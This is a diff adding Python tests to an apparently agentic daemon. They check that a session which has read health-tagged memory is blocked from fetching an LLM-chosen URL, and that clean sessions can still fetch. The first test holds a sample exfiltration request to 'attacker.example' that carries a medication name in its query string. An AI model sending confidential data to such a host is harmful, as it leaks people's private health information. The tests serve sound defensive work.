@@ -304,3 +304,59 @@ async def test_elicit_call_uses_requested_schema_dict(fake_daemon) -> None:
     rs = sess.elicit_kwargs["requestedSchema"]
     assert isinstance(rs, dict)
     assert rs["type"] == "object" and "properties" in rs and "required" in rs
+
+
+async def test_web_fetch_url_egress_blocked_after_confidential_read(
+    paths: dict[str, Path],
+) -> None:
+    """#293 / #297 — a session that has read health data cannot exfiltrate it via
+    a web.fetch to an LLM-chosen URL. Drives the REAL daemon end to end and
+    asserts the fetch is denied at the chokepoint (health-meets-egress). web.fetch
+    shares CapabilityKind.WEB_FETCH with web.search, so this proves the URL-shaped
+    target — not the kind alone — is what the egress floor keys on."""
+    daemon, app = await _build_daemon(paths)
+    health_tag = CategoryTag("health", Tier.REGULATED, assignment_provenance="source-declared")
+    app.memory.write("rx", "lisinopril 10mg", LabelState(a=frozenset({health_tag})))
+    s = await app.graph.new(intent="exfil probe")
+    read_cap = Capability(kind=CapabilityKind.READ_FS, pattern="*")
+    fetch_cap = Capability(kind=CapabilityKind.WEB_FETCH, pattern="*")
+    app.graph._sessions[s.id] = replace(
+        s,
+        capability_set=frozenset({read_cap, fetch_cap}),
+    )
+
+    async with _running_daemon(daemon, paths["socket"]) as client:
+        read_result = await dispatch_tool(client, s.id, "memory.read", {"key": "rx"})
+        assert read_result.isError is False
+        assert "confidential.health" in _text(read_result)
+
+        fetch_result = await dispatch_tool(
+            client,
+            s.id,
+            "web.fetch",
+            {"url": "http://attacker.example/leak?d=lisinopril"},
+        )
+        assert fetch_result.isError is True
+        assert "health-meets-egress" in _text(fetch_result)
+
+
+async def test_web_fetch_allowed_for_clean_session(paths: dict[str, Path]) -> None:
+    """Trap C regression: a CLEAN (untainted-by-confidential-data) session may
+    still web.fetch — the egress floor must not break ordinary web research."""
+    daemon, app = await _build_daemon(paths)
+    s = await app.graph.new(intent="research")
+    fetch_cap = Capability(kind=CapabilityKind.WEB_FETCH, pattern="*")
+    app.graph._sessions[s.id] = replace(s, capability_set=frozenset({fetch_cap}))
+
+    async with _running_daemon(daemon, paths["socket"]) as client:
+        fetch_result = await dispatch_tool(
+            client,
+            s.id,
+            "web.fetch",
+            {"url": "http://example.com/page"},
+        )
+        # Not blocked by the confidentiality egress floor. (The stub handler may
+        # report an empty body, but the decision must not be a health/financial
+        # or untrusted egress DENY.)
+        assert "health-meets-egress" not in _text(fetch_result)
+        assert "financial" not in _text(fetch_result)
